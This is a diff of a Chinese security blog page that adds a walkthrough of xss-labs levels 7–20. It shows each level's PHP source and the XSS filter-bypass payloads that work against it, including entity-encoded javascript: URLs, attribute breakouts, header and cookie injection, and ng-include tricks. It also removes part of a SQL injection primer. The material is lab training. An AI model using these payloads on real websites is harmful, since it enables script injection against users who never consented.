class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level7.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level7.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了href和script。尝试大小写不能进行绕过。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417142620946.png" alt="image-20200417142620946"></p>
+<p>因为href和script被过滤尝试一下双写看看能否绕过</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417143343630.png" alt="image-20200417143343630"></p>
+<p>点击超链接，成功弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417143500825.png" alt="image-20200417143500825"></p>
+<h4 id="xss-labs第八关"><a href="#xss-labs第八关" class="headerlink" title="xss-labs第八关"></a>xss-labs第八关</h4><p>源码</p>
+<p>分析</p>
+<ul>
+<li><p>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</p>
+</li>
+<li><p>第一次引用keyword时，采用了htmlspecialchars</p>
+</li>
+<li><p>第二次引用keyword时，是在a标签中，而且没有用htmlspecialchars编码</p>
+</li>
+<li><p>考虑编码绕过：hackbar的XSS HTML Characters编码，可将所有字符（不同于htmlspecialchars仅将特殊字符编码）编码为HTML实体，从而绕过过滤。</p>
+</li>
+<li><p>然后构造弹框语句，注意到编码绕过后，在第二次引用keyword时，虽然没有htmlspecialchars编码，但是我们事先已经自己将提交的keyword编码为html实体了，所以此时输入的标签不会被执行，而是被当作普通字符串，所以只能构造href超链接，而不能闭合a标签。</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level9.php?keyword&#x3D;not bad!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level8&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level8.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level8.jpg&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>javascript关键字被替换。尝试大小写，重复写，无法进行绕过。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417144646785.png" alt="image-20200417144646785"></p>
+<p>尝试进行Unicode编码</p>
+<p>payload：<code>&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417151325070.png" alt="image-20200417151325070"></p>
+<h4 id="xss-labs第九关"><a href="#xss-labs第九关" class="headerlink" title="xss-labs第九关"></a>xss-labs第九关</h4><p>查看源码</p>
+<p>分析：</p>
+<ul>
+<li>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</li>
+<li>规定在输入中必须包含http://</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level10.php?keyword&#x3D;well done!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level9&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level9.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false&#x3D;&#x3D;&#x3D;strpos($str7,&#39;http:&#x2F;&#x2F;&#39;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level9.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造内容，在响应查找构造的字符串</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417151831245.png" alt="image-20200417151831245"></p>
+<p>这次并没有在href中所以在尝试一下script标签</p>
+<p>可以看到，双引号颜色不一样</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417152024621.png" alt="image-20200417152024621"></p>
+<p>发现这里对url进行了限制，必须包含<code>http://</code></p>
+<p>尝试构造<code>javascript:alert(1)http://</code>，居然不对</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194057445.png" alt="image-20200417194057445"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194113198.png" alt="image-20200417194113198"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194649514.png" alt="image-20200417194649514"></p>
+<p>确实不对，那该怎么办呢，两</p>
+<p>个解决办法：注释或者把http://放到aler()里面</p>
+<p>payload：</p>
+<p><code>javascr&amp;#x69;pt:alert(1)//http://</code></p>
+<p><code>javascr&amp;#x69;pt:alert(&amp;#x22;http://&amp;#x22;)</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194534225.png" alt="image-20200417194534225"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417194731442.png" alt="image-20200417194731442"></p>
+<h4 id="xss-labs第十关"><a href="#xss-labs第十关" class="headerlink" title="xss-labs第十关"></a>xss-labs第十关</h4><p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level11.php?keyword&#x3D;good job!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level10&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form id&#x3D;search&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level10.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>页面中没有任何可以点击输入框，但是url可以输入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195222663.png" alt="image-20200417195222663"></p>
+<p>使用之前闭合查看发现尖括号被过滤，但是这里有三个隐藏的参数，不明白，看看源码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195429986.png" alt="image-20200417195429986"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195543547.png" alt="image-20200417195543547"></p>
+<p>keyword被htmlspecialchars过滤，但是还有一个参数t_sort没有防护，只是过滤了尖括号，然后放到了一个input标签中隐藏起来，如果找不到可以t_link、t_history、t_sort这三个每个都尝试一下，会发现t_sort可以使用</p>
+<p>可以闭合双引号，使用<code>onclick</code>事件，然后把隐藏的标签用<code>text</code>方式回显出来即可，最后的payload：<code>?t_sort=&quot; onclick=alert(1) type=&quot;text&quot;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195733849.png" alt="image-20200417195733849"></p>
+<p>成功显示了输入框，使用的onclick，需要单击一下输入框，成功返回</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417195815568.png" alt="image-20200417195815568"></p>
+<h4 id="xss-labs第十一关"><a href="#xss-labs第十一关" class="headerlink" title="xss-labs第十一关"></a>xss-labs第十一关</h4><p>查看响应</p>
+<p>发现有一个t_ref字段是http referer的值，可能存在xss注入点</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418085345849.png" alt="image-20200418085345849"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418085849316.png" alt="image-20200418085849316"></p>
+<p>因为是referer所以需要使用burp抓包，然后修改referer的参数</p>
+<p>修改前的参数</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418090943906.png" alt="image-20200418090943906"></p>
+<p>修改后的参数</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091152599.png" alt="image-20200418091152599"></p>
+<p>修改完放行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091254595.png" alt="image-20200418091254595"></p>
+<p>点击输入框，成功弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418091314306.png" alt="image-20200418091314306"></p>
+<h4 id="xss-labs第十二关"><a href="#xss-labs第十二关" class="headerlink" title="xss-labs第十二关"></a>xss-labs第十二关</h4><p>下查看响应</p>
+<p>可以看到t_ua是http  User-Agent的值。所以还是需要抓包修改</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092006907.png" alt="image-20200418092006907"></p>
+<p>进行抓包，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092823329.png" alt="image-20200418092823329"></p>
+<p>成功弹出弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418092306031.png" alt="image-20200418092306031"></p>
+<h4 id="xss-labs第十三关"><a href="#xss-labs第十三关" class="headerlink" title="xss-labs第十三关"></a>xss-labs第十三关</h4><p>查看响应</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418093556616.png" alt="image-20200418093556616"></p>
+<p>跟前两关一样，直接使用burp抓包，修改cookie的内容</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418095753042.png" alt="image-20200418095753042"></p>
+<p>进行放行，单击箭头处的英文</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418095842868.png" alt="image-20200418095842868"></p>
+<p>页面成功弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418100012077.png" alt="image-20200418100012077"></p>
+<h4 id="xss-labs第十四关"><a href="#xss-labs第十四关" class="headerlink" title="xss-labs第十四关"></a>xss-labs第十四关</h4><p>登不上，可以直接看先知上的wp了解exif xss</p>
+<p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</a></p>
+<h4 id="xss-labs第十五关"><a href="#xss-labs第十五关" class="headerlink" title="xss-labs第十五关"></a>xss-labs第十五关</h4><p>查看响应</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418102611400.png" alt="image-20200418102611400"></p>
+<ul>
+<li>这题有angular js，然后ng-include相当于php的include函数，然后src参数被转义了，最终我们可以include leve1然后再用img标签传xss(这里我用firefox打不成功，但是换chrome就可以了)</li>
+</ul>
+<p>payload：<code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
+<p>页面成功返回</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418102458614.png" alt="image-20200418102458614"></p>
+<h4 id="xss-labs第十六关"><a href="#xss-labs第十六关" class="headerlink" title="xss-labs第十六关"></a>xss-labs第十六关</h4><p>查看源码</p>
+<p>发现对script、/、空格进行了转换，需要进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这只是截取了其中的php代码</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看响应</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131112382.png" alt="image-20200418131112382"></p>
+<p>采用回车符%0a进行绕过,触发payload。</p>
+<p>payload：<code>&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131643401.png" alt="image-20200418131643401"></p>
+<p>提交之后点击图片弹出弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418131703210.png" alt="image-20200418131703210"></p>
+<h4 id="xss-labs第十七关"><a href="#xss-labs第十七关" class="headerlink" title="xss-labs第十七关"></a>xss-labs第十七关</h4><p>查看响应，发现两个输出点</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132402889.png" alt="image-20200418132402889"></p>
+<p>可以在这两个输出点上进行尝试</p>
+<p>payload：<code>onmouseover=alert(1)</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132611943.png" alt="image-20200418132611943"></p>
+<p>因为用的是onmouseover所以当鼠标放到图片上时会触发xss从而执行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418132656388.png" alt="image-20200418132656388"></p>
+<h4 id="xss-labs第十八关"><a href="#xss-labs第十八关" class="headerlink" title="xss-labs第十八关"></a>xss-labs第十八关</h4><p>和上一关相同</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418151906701.png" alt="image-20200418151906701"></p>
+<p>payload：<code>onmouseover=alert(1)</code></p>
+<p>在地址栏输入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418152112711.png" alt="image-20200418152112711"></p>
+<p>鼠标放到黑色的图片上，弹出弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200418152128213.png" alt="image-20200418152128213"></p>
+<h4 id="xss-labs第十九关"><a href="#xss-labs第十九关" class="headerlink" title="xss-labs第十九关"></a>xss-labs第十九关</h4><p>flash xss，涉及到反编译，没研究明白</p>
+<h4 id="xss-labs第二十关"><a href="#xss-labs第二十关" class="headerlink" title="xss-labs第二十关"></a>xss-labs第二十关</h4><p>flash xss，涉及到反编译，没研究明白</p>
+</script></li></ul>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -4663,344 +4980,10 @@
 
 
   
-    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="article-meta">
-      <a href="/2020/04/03/sql%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2020-04-03T06:09:55.917Z" itemprop="datePublished">2020-04-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/03/sql%E6%B3%A8%E5%85%A5/">
-        sql注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h4><p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作</p>
-<h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><p>SQL注入的而产生的需要满足两个条件：</p>
-<ul>
-<li>参数用户可控：前端传给后端的参数内容是用户可以控制的</li>
-<li>参数代入数据库查询：传入的参数拼接到SQL语句查询，且带入数据库查询</li>
-</ul>
-<h5 id="当传入的参数为1’时-数据库执行代码如下"><a href="#当传入的参数为1’时-数据库执行代码如下" class="headerlink" title="当传入的参数为1’时,数据库执行代码如下"></a>当传入的参数为1’时,数据库执行代码如下</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
-
-<h5 id="这不符合数据库语法规范，所以会报错，传入参数and-1-1时，执行的SQL语句如下"><a href="#这不符合数据库语法规范，所以会报错，传入参数and-1-1时，执行的SQL语句如下" class="headerlink" title="这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下"></a>这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
-
-<p>因为1=1为真，where语句中id=1也为真，页面返回与id=1相同的结果。当传入参数and 1=2 时，1=2不成立，返回与id=1不同的结果。由此可以判断ID参数存在sql注入。</p>
-<h4 id="SQL注入相关知识"><a href="#SQL注入相关知识" class="headerlink" title="SQL注入相关知识"></a>SQL注入相关知识</h4><p>在mysql5.0版本后，默认在数据库有一个information_schema的库，要记住其中三个表名，</p>
-<p>分别是SCHEMATA(schemata)、TABLES(tables)、COLUMNS(columns)。</p>
-<ul>
-<li><strong>SCHEMATA</strong>表存储该用户创建的所有数据库的<strong>库名</strong>，该表中记录<strong>数据库字段</strong>的名为<strong>SCHEMA_NAME(schema_name)</strong></li>
-<li><strong>TABLES</strong>表存储该用户创建的所有数据库的<strong>库名</strong>和<strong>表名</strong>，该表中记录数据库<strong>库名</strong>和<strong>表名</strong>的字段，分别为<strong>TABLE_SHCEMA(table_schema)</strong>和<strong>TABLE_NAME(table_name)</strong></li>
